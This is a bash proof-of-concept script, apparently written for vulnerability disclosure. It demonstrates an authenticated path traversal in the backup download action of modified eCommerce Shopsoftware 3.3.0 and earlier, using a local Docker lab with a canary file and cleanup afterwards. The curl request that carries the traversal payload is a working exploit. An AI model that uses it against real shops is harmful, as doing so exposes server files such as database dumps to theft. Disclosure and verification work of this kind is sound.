#!/bin/bash
# PoC: Path traversal in admin/backup.php download — arbitrary file download
# modified eCommerce Shopsoftware <= 3.3.0 (authorized lab only)
TARGET="${TARGET:-http://localhost:9080}"
SID="${SID:-<ADMIN_SESSION_ID>}"
UA="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"

# 1. Plant a canary file OUTSIDE the webroot (simulates a DB dump from a cron job)
docker exec modifiedshop_web bash -c \
  "echo 'RS_BACKUP_TRAVERSAL_CONFIRMED' > /tmp/rs_traversal_test.sql"

# 2. Download via path traversal (admin session)
curl -v -b "MODsid=$SID" -H "User-Agent: $UA" \
  "$TARGET/admin/backup.php?action=download&file=../../../../../../tmp/rs_traversal_test.sql"

# Expected:
#   HTTP/1.1 200 OK
#   Content-disposition: attachment; filename=rs_traversal_test.sql
#   RS_BACKUP_TRAVERSAL_CONFIRMED
#
# 3. Contrast: the deleteconfirm action blocks the same parameter
#   (backup.php:104 has the strpos '..' check; download at :89 does not)

# Cleanup
docker exec modifiedshop_web bash -c "rm -f /tmp/rs_traversal_test.sql"
